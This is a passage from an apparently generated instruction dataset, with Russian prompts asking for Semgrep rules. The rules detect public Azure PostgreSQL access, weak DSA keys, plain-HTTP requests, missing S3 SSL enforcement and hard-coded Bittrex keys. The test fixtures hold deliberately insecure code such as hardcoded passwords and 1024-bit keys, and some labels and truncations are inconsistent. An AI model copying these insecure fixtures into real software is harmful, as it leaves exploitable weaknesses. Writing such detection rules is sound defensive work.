Серьезность: WARNING",
    "metadata": {
      "rule_id": "template-explicit-unescape",
      "language": "regex",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши Semgrep правило для обнаружения: azure-postgresql-server-public-access-disabled\nОписание уязвимости: Ensure public network access enabled is set to False for PostgreSQL servers\nCWE: CWE-1220: Insufficient Granularity of Access Control\nТип анализа: search\nЯзык: hcl",
    "input": "Требования:\n- Язык: hcl\n- Тип анализа: search\n- CWE: CWE-1220: Insufficient Granularity of Access Control\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: azure-postgresql-server-public-access-disabled.tf\n# fail\n# ruleid: azure-postgresql-server-public-access-disabled\nresource \"azurerm_postgresql_server\" \"example\" {\n    name                = \"example-psqlserver\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    administrator_login          = \"psqladminun\"\n    administrator_login_password = \"H@Sh1CoR3!\"\n\n    sku_name   = \"GP_Gen5_4\"\n    version    = \"9.6\"\n    storage_mb = 640000\n\n    backup_retention_days        = 7\n    geo_redundant_backup_enabled = true\n    auto_grow_enabled            = true\n\n    public_network_access_enabled    = true\n    ssl_enforcement_enabled          = true\n    ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}\n\n# fail\n# ruleid: azure-postgresql-server-public-access-disabled\nresource \"azurerm_postgresql_server\" \"example\" {\n    name                = \"example-psqlserver\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    administrator_login          = \"psqladminun\"\n    administrator_login_password = \"H@Sh1CoR3!\"\n\n    sku_name   = \"GP_Gen5_4\"\n    version    = \"9.6\"\n    storage_mb = 640000\n\n    backup_retention_days        = 7\n    geo_redundant_backup_enabled = true\n    auto_grow_enabled            = true\n    ssl_enforcement_enabled          = true\n    ssl_minimal_tls_version_enforced = \"TLS1_2\"\n}\n\n# pass\nresource \"azurerm_postgresql_server\" \"example\" {\n    name                = \"example-psqlserver\"\n    location            = azurerm_resource_group.example.location\n    resource_group_name = azurerm_resource_group.example.name\n\n    administrator_login          = \"psqladminun\"\n    administrator_login_password = \"H@Sh1CoR3!\"\n\n    sku_name   = \"GP_Gen5_4\"\n    version    = \"9.6\"\n    storage_mb = 640000\n\n    backup_retention_days        = 7\n    geo_redundant_backup_enabled = true\n    auto_grow_enabled            = true\n\n    public_network_  # Ограничиваем длину\n\nОпасные паттерны:\n• resource \"azurerm_postgresql_server\" \"example\" { ... public_network_access_enabled = true ... }\n• resource \"azurerm_postgresql_server\" \"example\" { ... public_network_access_enabled = true ... }\n\nБезопасные паттерны:  \n• resource \"azurerm_postgresql_server\" \"example\" { ... public_network_access_enabled = false ... }\n\nЛегенда аннотаций:\n- // ruleid:azure-postgresql-server-public-access-disabled: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:azure-postgresql-server-public-access-disabled: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: azure-postgresql-server-public-access-disabled\n  message: >-\n    Ensure public network access enabled is set to False for PostgreSQL servers\n  patterns:\n  - pattern: resource\n  - pattern-inside: |\n      resource \"azurerm_postgresql_server\" \"...\" {\n      ...\n      }\n  - pattern-not-inside: |\n      resource \"azurerm_postgresql_server\" \"...\" {\n      ...\n      public_network_access_enabled = false\n      ...\n      }\n  metadata:\n    owasp:\n    - A05:2017 - Broken Access Control\n    - A01:2021 - Broken Access Control\n    cwe:\n    - 'CWE-1220: Insufficient Granularity of Access Control'\n    category: security\n    technology:\n    - terraform\n    - azure\n    references:\n    - https://owasp.org/Top10/A01_2021-Broken_Access_Control\n    subcategory:\n    - audit\n    likelihood: LOW\n    impact: LOW\n    confidence: LOW\n  languages: [hcl]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска ресурсов Azure PostgreSQL Server в конфигурационном файле Terraform (TF) с расширением .tf. Правило проверяет наличие ресурса типа 'azurerm_postgresql_server' и ищет внутри него атрибут 'public_network_access_enabled'. Если этот атрибут не установлен в значение 'false', то правило помечает код как опасный. Безопасным считается случай, когда атрибут явно установлен в 'false'.\n\n# Ключевые элементы:\n- ID: azure-postgresql-server-public-access-disabled\n- Язык: hcl \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "azure-postgresql-server-public-access-disabled",
      "language": "hcl",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения unnecessary-checked-arithmetic-in-loop\nОписание уязвимости: A lot of times there is no risk that the loop counter can overflow.  Using Solidity's unchecked block saves the overflow checks.\nCWE: \nТип анализа: search\nЯзык: solidity",
    "input": "Требования:\n- Язык: solidity\n- Тип анализа: search\n- CWE: \n- Серьезность: INFO\n\nКонтекст кода:\n// File: unnecessary-checked-arithmetic-in-loop.sol\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.2;\n\ncontract TestRequiere {\n    function test(uint256 a) public {\n        uint len = supportedTokens.length;\n        // ruleid: unnecessary-checked-arithmetic-in-loop\n        for (uint i; i < len; i++) {\n            uint256 variable;\n            // ok: unnecessary-checked-arithmetic-in-loop\n            count++;\n        }\n    }\n\n    function test2(uint256 a) public {\n        uint len = supportedTokens.length;\n        // ruleid: unnecessary-checked-arithmetic-in-loop\n        for (uint i = 0; i < len; i++) {\n            // ...\n            uint256 variable;\n        }\n    }\n\n    function test3(uint256 a) public {\n        uint len = supportedTokens.length;\n        for (uint i; i < len;) {\n            // ruleid: unnecessary-checked-arithmetic-in-loop\n            i++;\n            uint256 pp = 10;\n        }\n    }\n\n    function test4(uint256 a) public {\n        uint len = supportedTokens.length;\n        for (uint i = 0; i < len;) {\n            // ruleid: unnecessary-checked-arithmetic-in-loop\n            ++i;\n            uint256 pp = 10;\n        }\n    }\n\n    function test5(uint256 a) public {\n        uint len = supportedTokens.length;\n        for (uint i = 0; i < len;) {\n            // ok: unnecessary-checked-arithmetic-in-loop\n            unchecked {\n                ++i;\n            }\n            uint256 pp = 10;\n        }\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• for (uint i; i < len; i++) { ... }\n• for (uint i = 0; i < len; i++) { ... }\n• for (uint i; i < len;) { i++; ... }\n\nБезопасные паттерны:  \n• for (uint i; i < len;) { ... }\n• for (uint i = 0; i < len;) { ... }\n• unchecked { ... i++; ... }\n\nЛегенда аннотаций:\n- // ruleid:unnecessary-checked-arithmetic-in-loop: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:unnecessary-checked-arithmetic-in-loop: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n    - id: unnecessary-checked-arithmetic-in-loop\n      message: >-\n        A lot of times there is no risk that the loop counter can overflow. \n        Using Solidity's unchecked block saves the overflow checks.\n      metadata:\n        references:\n          - https://github.com/byterocket/c4-common-issues/blob/main/0-Gas-Optimizations.md/#g011---unnecessary-checked-arithmetic-in-for-loop\n        category: performance\n        technology:\n          - solidity\n      patterns:\n      - pattern-either:\n          - pattern-inside: |\n              for ($TYPE $VAR = ... ; ...; ...) {\n                ...\n              }\n          - pattern-inside: |\n              for ($TYPE $VAR = ...; ...) {\n                ...\n              }\n          - pattern-inside: |\n              for ($TYPE $VAR; ...; ...) {\n                ...\n              }\n          - pattern-inside: |\n              for ($TYPE $VAR; ...) {\n                ...\n              }\n      - pattern-either:\n          - pattern: |\n              $VAR++\n          - pattern: |\n              ++$VAR\n      - pattern-not-inside: |\n          unchecked {\n            ...\n            <... $VAR ...>;\n            ...\n          }\n      languages:\n        - solidity\n      severity: INFO\n  \n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска циклов for в Solidity, где отсутствует необходимость проверять переполнение счетчика цикла. Правило использует шаблон, который ищет конструкции for с различными форматами инициализации и итерации, а затем проверяет наличие инкремента переменной внутри тела цикла. Дополнительно исключаются случаи использования блока unchecked вокруг инкрементации переменной.\n\n# Ключевые элементы:\n- ID: unnecessary-checked-arithmetic-in-loop\n- Язык: solidity \n- Тип: \n- Серьезность: INFO",
    "metadata": {
      "rule_id": "unnecessary-checked-arithmetic-in-loop",
      "language": "solidity",
      "severity": "INFO",
      "rule_type": "",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения wp-file-manipulation-audit\nОписание уязвимости: These functions can be used to delete the files if the data inside the functions are user controlled. Use these functions carefully.\nCWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\nТип анализа: search\nЯзык: php",
    "input": "Требования:\n- Язык: php\n- Тип анализа: search\n- CWE: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: wp-file-manipulation-audit.php\n<?php\n\n// ruleid: wp-file-manipulation-audit\nwp_delete_file( $file_path );\n\n// ruleid: wp-file-manipulation-audit\nunlink($file_path);\n\n// ok: wp-file-manipulation-audit\nsome_other_function($args);\n\n\n?>  # Ограничиваем длину\n\nОпасные паттерны:\n• wp_delete_file( $file_path );\n• unlink($file_path);\n\nБезопасные паттерны:  \n• some_other_function($args);\n\nЛегенда аннотаций:\n- // ruleid:wp-file-manipulation-audit: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:wp-file-manipulation-audit: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n  - id: wp-file-manipulation-audit\n    patterns:\n      - pattern-either:\n          - pattern: unlink(...)\n          - pattern: wp_delete_file(...)\n    message: >-\n      These functions can be used to delete the files if the data inside the\n      functions are user controlled. Use these functions carefully.\n    paths:\n      include:\n        - '**/wp-content/plugins/**/*.php'\n    languages:\n      - php\n    severity: WARNING\n    metadata:\n      category: security\n      confidence: LOW\n      likelihood: LOW\n      impact: HIGH\n      subcategory:\n        - audit\n      technology:\n        - Wordpress Plugins\n      references:\n        - https://github.com/wpscanteam/wpscan/wiki/WordPress-Plugin-Security-Testing-Cheat-Sheet#file-manipulation\n      owasp:\n        - A01:2021 - Broken Access Control\n        - A08:2021 - Software and Data Integrity Failures\n      cwe:\n        - \"CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"\n        - \"CWE-73: The software allows user input to control or influence paths of file names that are used in filesystem operations.\"\n        - \"CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')\"\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска использования функций unlink() и wp_delete_file(), которые могут быть использованы для удаления файлов, если данные внутри этих функций контролируются пользователем. Анализ выполняется путем поиска вызовов этих конкретных функций вне зависимости от контекста их вызова. Правило применимо только к файлам PHP в папке wp-content/plugins/ и имеет низкий уровень уверенности и вероятности возникновения проблемы, но высокий потенциальный ущерб.\n\n# Ключевые элементы:\n- ID: wp-file-manipulation-audit\n- Язык: php \n- Тип: audit\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "wp-file-manipulation-audit",
      "language": "php",
      "severity": "WARNING",
      "rule_type": "audit",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай Semgrep правило для: insufficient-dsa-key-size\nОписание уязвимости: Detected an insufficient key size for DSA. NIST recommends a key size of 2048 or higher.\nCWE: CWE-326: Inadequate Encryption Strength\nТип анализа: search\nЯзык: python",
    "input": "Требования:\n- Язык: python\n- Тип анализа: search\n- CWE: CWE-326: Inadequate Encryption Strength\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: insufficient-dsa-key-size.py\nfrom cryptography.hazmat import backends\nfrom cryptography.hazmat.primitives.asymmetric import dsa\n\n# ok: insufficient-dsa-key-size\ndsa.generate_private_key(key_size=2048,\n                         backend=backends.default_backend())\n\n# ok: insufficient-dsa-key-size\ndsa.generate_private_key(2048,\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-dsa-key-size\ndsa.generate_private_key(key_size=1024,\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-dsa-key-size\ndsa.generate_private_key(1024,\n                         backend=backends.default_backend())\n\n\n// File: insufficient-dsa-key-size.fixed.py\nfrom cryptography.hazmat import backends\nfrom cryptography.hazmat.primitives.asymmetric import dsa\n\n# ok: insufficient-dsa-key-size\ndsa.generate_private_key(key_size=2048,\n                         backend=backends.default_backend())\n\n# ok: insufficient-dsa-key-size\ndsa.generate_private_key(2048,\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-dsa-key-size\ndsa.generate_private_key(key_size=2048,\n                         backend=backends.default_backend())\n\n# ruleid: insufficient-dsa-key-size\ndsa.generate_private_key(2048,\n                         backend=backends.default_backend())  # Ограничиваем длину\n\nОпасные паттерны:\n• dsa.generate_private_key(key_size=1024, ...)\n• dsa.generate_private_key(1024, ...)\n\nБезопасные паттерны:  \n• dsa.generate_private_key(key_size=2048, ...)\n• dsa.generate_private_key(2048, ...)\n\nЛегенда аннотаций:\n- // ruleid:insufficient-dsa-key-size: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:insufficient-dsa-key-size: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: insufficient-dsa-key-size\n  patterns:\n  - pattern-either:\n    - pattern: cryptography.hazmat.primitives.asymmetric.dsa.generate_private_key(..., key_size=$SIZE,\n        ...)\n    - pattern: cryptography.hazmat.primitives.asymmetric.dsa.generate_private_key($SIZE, ...)\n  - metavariable-comparison:\n      metavariable: $SIZE\n      comparison: $SIZE < 2048\n  - focus-metavariable: $SIZE\n  fix: |\n      2048\n  message: >-\n    Detected an insufficient key size for DSA. NIST recommends\n    a key size of 2048 or higher.\n  metadata:\n    cwe:\n    - 'CWE-326: Inadequate Encryption Strength'\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    source-rule-url: https://github.com/PyCQA/bandit/blob/b1411bfb43795d3ffd268bef17a839dee954c2b1/bandit/plugins/weak_cryptographic_key.py\n    references:\n    - https://www.cosic.esat.kuleuven.be/ecrypt/ecrypt2/documents/D.SPA.20.pdf\n    - https://cryptography.io/en/latest/hazmat/primitives/asymmetric/dsa/\n    - https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-57Pt3r1.pdf\n    category: security\n    technology:\n    - cryptography\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    functional-categories:\n    - crypto::search::key-length::cryptography\n  languages: [python]\n  severity: WARNING\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов функции generate_private_key из модуля cryptography.hazmat.primitives.asymmetric.dsa с параметром key_size, значение которого меньше рекомендованного уровня безопасности (2048). Правило использует шаблон или (pattern-either) для охвата обоих возможных синтаксических форм вызова функции. Затем оно проверяет метапеременную $SIZE с помощью сравнения, чтобы определить, соответствует ли размер ключа минимальным требованиям безопасности. Если условие выполняется, выдается предупреждение о недостаточной длине ключа DSA.\n\n# Ключевые элементы:\n- ID: insufficient-dsa-key-size\n- Язык: python \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "insufficient-dsa-key-size",
      "language": "python",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Напиши правило Semgrep для: aws-cdk-bucket-enforcessl\nОписание уязвимости: Bucket $X is not set to enforce encryption-in-transit, if not explictly setting this on the bucket policy - the property \"enforceSSL\" should be set to true\nCWE: CWE-319: Cleartext Transmission of Sensitive Information\nТип анализа: search\nЯзык: ts",
    "input": "Требования:\n- Язык: ts\n- Тип анализа: search\n- CWE: CWE-319: Cleartext Transmission of Sensitive Information\n- Серьезность: ERROR\n\nКонтекст кода:\n// File: awscdk-bucket-enforcessl.ts\nimport * as s3 from '@aws-cdk/aws-s3';\nimport * as cdk from '@aws-cdk/core';\nimport * as rename_s3 from '@aws-cdk/aws-s3';\nimport {Bucket} from '@aws-cdk/aws-s3';\n\nexport class CdkStarterStack extends cdk.Stack {\n  constructor(scope: cdk.App, id: string, props?: cdk.StackProps) {\n    super(scope, id, props);\n\n    // ruleid:aws-cdk-bucket-enforcessl\n    const badBucket = new s3.Bucket(this, 's3-bucket-bad')\n    // ok:aws-cdk-bucket-enforcessl\n    const AnotherGoodBucket = new s3.Bucket(this, 's3-bucket', {\n      enforceSSL: true\n    })\n    // ruleid:aws-cdk-bucket-enforcessl\n    const badBucket2 = new s3.Bucket(this, 's3-bucket-bad', {\n      enforceSSL: false\n     })\n    // ruleid:aws-cdk-bucket-enforcessl\n    const badBucketRenamed = new rename_s3.Bucket(this, 's3-bucket-bad')\n    // ok:aws-cdk-bucket-enforcessl\n    const AnotherGoodBucketRenamed = new rename_s3.Bucket(this, 's3-bucket', {\n      enforceSSL: true\n    })\n    // ruleid:aws-cdk-bucket-enforcessl\n    const badBucket2Renamed = new rename_s3.Bucket(this, 's3-bucket-bad', {\n      enforceSSL: false\n     })\n\n     // ruleid:aws-cdk-bucket-enforcessl\n     const badBucketDirect = new Bucket(this, 's3-bucket-bad')\n     // ok:aws-cdk-bucket-enforcessl\n     const AnotherGoodBucketDirect = new Bucket(this, 's3-bucket', {\n       enforceSSL: true\n     })\n     // ruleid:aws-cdk-bucket-enforcessl\n     const badBucket2Direct = new Bucket(this, 's3-bucket-bad', {\n       enforceSSL: false\n      })\n  }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• const badBucket = new s3.Bucket(this, 's3-bucket-bad')\n• const badBucket2 = new s3.Bucket(this, 's3-bucket-bad', {enforceSSL: false})\n• const badBucketRenamed = new rename_s3.Bucket(this, 's3-bucket-bad')\n\nБезопасные паттерны:  \n• const AnotherGoodBucket = new s3.Bucket(this, 's3-bucket', {enforceSSL: true})\n• const AnotherGoodBucketRenamed = new rename_s3.Bucket(this, 's3-bucket', {enforceSSL: true})\n• const AnotherGoodBucketDirect = new Bucket(this, 's3-bucket', {enforceSSL: true})\n\nЛегенда аннотаций:\n- // ruleid:aws-cdk-bucket-enforcessl: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:aws-cdk-bucket-enforcessl: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: aws-cdk-bucket-enforcessl\n  message: Bucket $X is not set to enforce encryption-in-transit, if not explictly setting this on the\n    bucket policy - the property \"enforceSSL\" should be set to true\n  metadata:\n    cwe:\n    - 'CWE-319: Cleartext Transmission of Sensitive Information'\n    category: security\n    technology:\n    - AWS-CDK\n    references:\n    - https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html\n    owasp:\n    - A03:2017 - Sensitive Data Exposure\n    - A02:2021 - Cryptographic Failures\n    subcategory:\n    - vuln\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n  languages:\n  - ts\n  severity: ERROR\n  pattern-either:\n  - patterns:\n    - pattern-inside: |\n        import {Bucket} from '@aws-cdk/aws-s3';\n        ...\n    - pattern: const $X = new Bucket(...)\n    - pattern-not: |\n        const $X = new Bucket(..., {enforceSSL: true}, ...)\n  - patterns:\n    - pattern-inside: |\n        import * as $Y from '@aws-cdk/aws-s3';\n        ...\n    - pattern: const $X = new $Y.Bucket(...)\n    - pattern-not: |\n        const $X = new $Y.Bucket(..., {..., enforceSSL: true, ...})\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска случаев, когда создается объект типа Bucket из библиотеки aws-cdk/aws-s3 без явного указания свойства enforceSSL равным true. Анализ выполняется путем проверки наличия или отсутствия этого свойства при создании объекта Bucket. Если свойство не указано явно, то считается, что Bucket не настроен для обеспечения шифрования в процессе передачи, что является потенциальной угрозой безопасности, так как данные могут передаваться в открытом виде.\n\n# Ключевые элементы:\n- ID: aws-cdk-bucket-enforcessl\n- Язык: ts \n- Тип: vuln\n- Серьезность: ERROR",
    "metadata": {
      "rule_id": "aws-cdk-bucket-enforcessl",
      "language": "ts",
      "severity": "ERROR",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения httpget-http-request\nОписание уязвимости: Detected an HTTP request sent via HttpGet. This could lead to sensitive information being sent  over an insecure channel. Instead, it is recommended to send requests over HTTPS.\nCWE: C\nТип анализа: search\nЯзык: java",
    "input": "Требования:\n- Язык: java\n- Тип анализа: search\n- CWE: C\n- Серьезность: WARNING\n\nКонтекст кода:\n// File: httpget-http-request.java\npackage Test;\n\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport org.apache.http.impl.client.HttpClients;\nimport org.apache.http.client.methods.HttpGet;\n\nclass Bad {\n    private static void sendbad1() throws IOException {\n        // ruleid: httpget-http-request\n        HttpGet httpGet = new HttpGet(\"http://example.com\");\n        HttpClients.createDefault().execute(httpGet);\n    }\n\n    private static void sendbad2() throws IOException {\n        String url = \"http://example.com\";\n        // ruleid: httpget-http-request\n        HttpGet httpGet = new HttpGet(url); \n        HttpClients.createDefault().execute(httpGet);\n    }\n}\n\npublic class Ok {\n    private static void sendok1() throws IOException {\n        // ok: httpget-http-request\n        HttpGet httpGet = new HttpGet(\"https://example.com\");\n        HttpClients.createDefault().execute(httpGet);\n    }\n\n    private static void sendok2() throws IOException {\n        String url = \"https://example.com\";\n        // ok: httpget-http-request\n        HttpGet httpGet = new HttpGet(url); \n        HttpClients.createDefault().execute(httpGet);\n    }\n}  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: httpget-http-request.java\n...\nHttpGet httpGet = new HttpGet(\"http://example.com\");\nHttpClients.createDefault().execute(httpGet);\n• // File: httpget-http-request.java\n...\nString url = \"http://example.com\";\nHttpGet httpGet = new HttpGet(url);\nHttpClients.createDefault().execute(httpGet);\n\nБезопасные паттерны:  \n• // File: httpget-http-request.java\n...\nHttpGet httpGet = new HttpGet(\"https://example.com\");\nHttpClients.createDefault().execute(httpGet);\n• // File: httpget-http-request.java\n...\nString url = \"https://example.com\";\nHttpGet httpGet = new HttpGet(url);\nHttpClients.createDefault().execute(httpGet);\n\nЛегенда аннотаций:\n- // ruleid:httpget-http-request: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:httpget-http-request: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: httpget-http-request\n  message: >-\n    Detected an HTTP request sent via HttpGet.\n    This could lead to sensitive information being sent \n    over an insecure channel. Instead, it is recommended\n    to send requests over HTTPS.\n  severity: WARNING\n  metadata:\n    likelihood: MEDIUM\n    impact: MEDIUM\n    confidence: MEDIUM\n    category: security\n    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information'\n    owasp: 'A03:2017 - Sensitive Data Exposure'\n    references:\n    - https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/net/URLConnection.html\n    - https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/net/URL.html#openConnection()\n    subcategory:\n    - vuln\n    technology:\n    - java\n    vulnerability: Insecure Transport\n  languages:\n  - java\n  fix-regex:\n    regex: '[Hh][Tt][Tt][Pp]://'\n    replacement: https://\n    count: 1\n  patterns:\n  - pattern: |\n      \"=~/[Hh][Tt][Tt][Pp]://.*/\"\n  - pattern-inside: |\n      $R = new HttpGet(\"=~/[Hh][Tt][Tt][Pp]://.*/\");\n      ...\n      $CLIENT. ... .execute($R, ...);\n\n\n# Логика правила:\nЭто правило Semgrep предназначено для поиска вызовов метода HttpGet с использованием протокола HTTP вместо HTTPS. Анализ выполняется путем поиска конструктора HttpGet, принимающего строку URL-адреса, содержащую схему 'http'. Паттерн использует регулярное выражение для сопоставления схемы URL и проверяет выполнение условия внутри вызова метода execute клиента HttpClient.\n\n# Ключевые элементы:\n- ID: httpget-http-request\n- Язык: java \n- Тип: vuln\n- Серьезность: WARNING",
    "metadata": {
      "rule_id": "httpget-http-request",
      "language": "java",
      "severity": "WARNING",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения bittrex-access-key\nОписание уязвимости: A gitleaks bittrex-access-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\nCWE: CWE-798: Use of Hard-coded Credentials\nТип анализа: search\nЯзык: regex",
    "input": "Требования:\n- Язык: regex\n- Тип анализа: search\n- CWE: CWE-798: Use of Hard-coded Credentials\n- Серьезность: INFO\n\nКонтекст кода:\n// File: bittrex-access-key.go\n// ruleid: bittrex-access-key\nbittrex_api_token = \"bdx13k0d9sv7j6nv97alzfmmf6iv75bx\"  # Ограничиваем длину\n\nОпасные паттерны:\n• // File: bittrex-access-key.go\n// ruleid: bittrex-access-key\nbittrex_api_token = \"bdx13k0d9sv7j6nv97alzfmmf6iv75bx\"\n• // File: example.py\nruleid: bittrex-access-key\nbittrex_access_key = 'bdx13k0d9sv7j6nv97alzfmmf6iv75bx'\n• // File: test.js\n// ruleid: bittrex-access-key\nconst bittrexKey = 'bdx13k0d9sv7j6nv97alzfmmf6iv75bx'\n\nБезопасные паттерны:  \n• // File: safe-code.go\ngoApiKey := os.Getenv(\"BITTREX_API_KEY\")\n• // File: python_code.py\napi_key = get_secret('BITTREX_ACCESS_KEY')\n• // File: nodejs_code.js\nconst bittrexKey = process.env.BITTREX_ACCESS_KEY\n\nЛегенда аннотаций:\n- // ruleid:bittrex-access-key: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:bittrex-access-key: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
    "output": "rules:\n- id: bittrex-access-key\n  message: A gitleaks bittrex-access-key was detected which attempts to identify hard-coded credentials. It is not recommended to store credentials in source-code, as this risks secrets being leaked and used by either an internal or external malicious adversary. It is recommended to use environment variables to securely provide credentials or retrieve credentials from a secure vault or HSM (Hardware Security Module).\n  languages:\n    - regex\n  severity: INFO\n  metadata:\n      likelihood: LOW\n      impact: MEDIUM\n      confidence: LOW\n      category: security\n      cwe:\n        - \"CWE-798: Use of Hard-coded Credentials\"\n      cwe2021-top25: true\n      cwe2022-top25: true\n      owasp:\n        - A07:2021 - Identification and Authentication Failures\n      references:\n        - https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html\n      source-rule-url: https://github.com/zricethezav/gitleaks/tree/master/cmd/generate/config/rules\n      subcategory:\n        - vuln\n      technology:\n        - gitleaks\n  patterns:\n    - pattern-regex: (?i)(?:bittrex)(?:[0-9a-z\\-_\\t .]{0,20})(?:[\\s|']|[\\s|\"]){0,3}(?:=|>|:{1,3}=|\\|\\|:|<=|=>|:|\\?=)(?:'|\\\"|\\s|=|\\x60){0,5}([a-z0-9]{32})(?:['|\\\"|\\n|\\r|\\s|\\x60|;]|$)\n\n\n# Логика правила:\nЭто правило Semgrep использует регулярное выражение для поиска жестко закодированного ключа доступа Bittrex в исходном коде. Регулярное выражение ищет строку, содержащую слово 'bittrex' в любом регистре, за которым следуют произвольные символы длиной от 0 до 20, затем символ '=' или один из нескольких операторов сравнения, после чего следует строка длиной 32 символа, представляющая собой хэш-код доступа. Правило применимо только к языкам, поддерживающим регулярные выражения.\n\n# Ключевые элементы:\n- ID: bittrex-access-key\n- Язык: regex \n- Тип: vuln\n- Серьезность: INFO",
    "metadata": {
      "rule_id": "bittrex-access-key",
      "language": "regex",
      "severity": "INFO",
      "rule_type": "vuln",
      "mode": "search",
      "is_validation": true
    }
  },
  {
    "instruction": "Создай правило Semgrep для обнаружения https-equiv\nОписание уязвимости: The correct attribute name for this meta tag is `http-equiv`, not `https-equiv`.\nCWE: \nТип анализа: search\nЯзык: html",
    "input": "Требования:\n- Язык: html\n- Тип анализа: search\n- CWE: \n- Серьезность: ERROR\n\nКонтекст кода:\n// File: https-equiv.html\n<!DOCTYPE html>\n<html lang=\"en-us\">\n  <head>\n    <meta charset=\"utf-8\" />\n    <!-- ok: https-equiv -->\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n\n    <!-- ruleid: https-equiv -->\n    <meta https-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\" />\n\n    <!-- ruleid: https-equiv -->\n    <meta https-equiv=\"X-UA-Compatible\" content=\"no closing tag\">\n\n    <!-- ruleid: https-equiv -->\n    <meta https-equiv='X-UA-Compatible' content='single brackets'>\n\n    <!-- ruleid: https-equiv -->\n    <meta https-equiv=X-UA-Compatible content=nobrackets>\n\n    <!-- ruleid: https-equiv -->\n    <meta content=\"backwards\" https-equiv=\"X-UA-Compatible\">\n\n    <!-- ok: https-equiv -->\n    <meta rel=\"stylesheet\" href=\"https-equiv\" />\n\n    <title>https-equiv test</title>\n  </head>\n</html>  # Ограничиваем длину\n\nОпасные паттерны:\n• <meta https-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n• <meta https-equiv=\"X-UA-Compatible\" content=\"no closing tag\">\n• <meta https-equiv='X-UA-Compatible' content='single brackets'>\n\nБезопасные паттерны:  \n• <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\">\n• <meta rel=\"stylesheet\" href=\"https-equiv\" />\n\nЛегенда аннотаций:\n- // ruleid:https-equiv: Метка для кода, который ДОЛЖЕН срабатывать на правило (опасный пример)\n- // ok:https-equiv: Метка для кода, который НЕ должен срабатывать на правило (безопасный пример)",
